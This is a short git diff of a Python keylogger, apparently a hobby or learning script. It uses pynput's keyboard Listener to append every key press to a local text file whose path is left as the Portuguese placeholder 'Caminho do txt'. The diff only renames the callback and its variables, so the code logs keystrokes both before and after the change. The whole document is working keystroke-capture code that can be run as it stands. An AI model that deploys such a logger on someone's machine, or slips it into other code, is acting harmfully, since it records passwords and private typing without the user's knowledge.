@@ -7,10 +7,12 @@ from pynput.keyboard import Listener
 
 logFile = "Caminho do txt"
 
-def writeLog(key):
-    keydata = str(key)
-    with open(logFile, "a") as f:
-        f.write(keydata)
-        
-with Listener(on_press=writeLog) as l:
-    l.join()
+def on_press(key):  
+    logging = str(key)
+    
+    with open(logFile, "a") as newlog:
+        newlog.write(logging)
+
+with Listener(on_press=on_press) as Listener:
+    Listener.join()
+
